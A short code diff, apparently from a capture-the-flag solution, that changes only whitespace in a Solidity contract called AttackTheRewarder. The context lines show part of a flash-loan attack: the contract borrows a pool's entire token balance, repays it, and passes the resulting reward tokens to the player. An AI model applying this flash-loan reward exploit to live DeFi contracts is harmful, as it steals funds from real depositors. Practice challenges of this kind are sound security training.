@@ -29,7 +29,7 @@ contract AttackTheRewarder {
     function attack() external {
         flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
     }
-
+ 
     function receiveFlashLoan(uint256 amount) external {
         require(msg.sender == address(flashLoanPool));
         require(tx.origin == player);
@@ -42,5 +42,5 @@ contract AttackTheRewarder {
         // Pay back the loan & send reward tokens to player
         liquidityToken.transfer(address(flashLoanPool), amount);
         rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
-    }
+    } 
 }
